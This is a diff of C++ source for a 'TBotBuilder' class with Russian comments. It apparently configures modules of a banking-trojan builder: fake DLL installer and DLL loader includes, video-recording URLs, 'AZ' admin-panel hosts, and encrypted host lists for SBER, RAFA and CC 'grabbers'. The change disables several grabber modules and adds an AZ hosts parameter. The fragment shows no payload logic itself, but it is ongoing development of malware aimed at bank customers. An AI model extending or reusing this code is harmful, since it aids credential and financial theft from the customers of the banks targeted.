@@ -12,12 +12,12 @@
 
 #include "Config.h"
 #include "Hunter.h"
-#include "JavaConfig.h"
+//#include "JavaConfig.h"
 #include "VideoRecorder.h"
 #include "FgrFilters.h"
 #include "AzConfig.h"
 #include "Sber.h"
-#include "Rafa.h"
+//#include "Rafa.h"
 #include "cc.h"
 #include "FakeDLLInstaller.h"
 #include "DllLoader.h"
@@ -1000,24 +1000,25 @@ __fastcall TBotBuilder::TBotBuilder(TComponent *AOwner)
 	new TBotParam(Module, VIDEOREC_PARAM_NAME_URLS, VIDEOREC_PARAM_SIZE_URLS, VIDEOREC_PARAM_ENCRYPTED_URLS,  false, "Адреса старта записиси видео");
 
 	// JAVA Config
-	Module = new TBotModule(this, Module_JavaConfig);
-	new TBotParam(Module, JAVA_PARAM_NAME, JAVA_PARAM_SIZE, JAVA_PARAM_ENCRYPTED, true, "Ссылки JAVA");
+//	Module = new TBotModule(this, Module_JavaConfig);
+//	new TBotParam(Module, JAVA_PARAM_NAME, JAVA_PARAM_SIZE, JAVA_PARAM_ENCRYPTED, true, "Ссылки JAVA");
 
-	// Ссылки AZ
+	// Настройки AZ
 	Module = new TBotModule(this, Module_AzConfig);
 	new TBotParam(Module, AZCONFIG_PARAM_NAME_AZUSER, AZCONFIG_PARAM_SIZE_AZUSER, AZCONFIG_PARAM_ENCRYPTED_AZUSER, true, "Имя пользователя AZ");
+	new TBotParam(Module, AZCONFIG_PARAM_NAME_HOSTS,  AZCONFIG_PARAM_SIZE_HOSTS,  AZCONFIG_PARAM_ENCRYPTED_HOSTS,  true, "Хосты AZ админки");
 
 	// Настройки грабера сбер
-	Module = new TBotModule(this, Module_SberHosts);
-	new TBotParam(Module, SBERHOSTS_PARAM_NAME, SBERHOSTS_PARAM_SIZE, SBERHOSTS_PARAM_ENCRYPTED, true, "Хосты грабера SBER");
+//	Module = new TBotModule(this, Module_SberHosts);
+//	new TBotParam(Module, SBERHOSTS_PARAM_NAME, SBERHOSTS_PARAM_SIZE, SBERHOSTS_PARAM_ENCRYPTED, true, "Хосты грабера SBER");
 
 	// Настройки параметров рафы
-	Module = new TBotModule(this, Module_RafaHosts);
-	new TBotParam(Module, RAFAHOSTS_PARAM_NAME, RAFAHOSTS_PARAM_SIZE, RAFAHOSTS_PARAM_ENCRYPTED, true, "Хосты грабера RAFA");
+//	Module = new TBotModule(this, Module_RafaHosts);
+//	new TBotParam(Module, RAFAHOSTS_PARAM_NAME, RAFAHOSTS_PARAM_SIZE, RAFAHOSTS_PARAM_ENCRYPTED, true, "Хосты грабера RAFA");
 
 	// Настройки системы CC
-	Module = new TBotModule(this, Module_CCHosts);
-	new TBotParam(Module, CCHOSTS_PARAM_NAME, CCHOSTS_PARAM_SIZE, ССHOSTS_PARAM_ENCRYPTED, true, "Хосты грабера CC");
+//	Module = new TBotModule(this, Module_CCHosts);
+//	new TBotParam(Module, CCHOSTS_PARAM_NAME, CCHOSTS_PARAM_SIZE, ССHOSTS_PARAM_ENCRYPTED, true, "Хосты грабера CC");
 
 	// Настройки анализатора истории навигации
 	Module = new TBotModule(this, Module_HistoryAnalyzer);
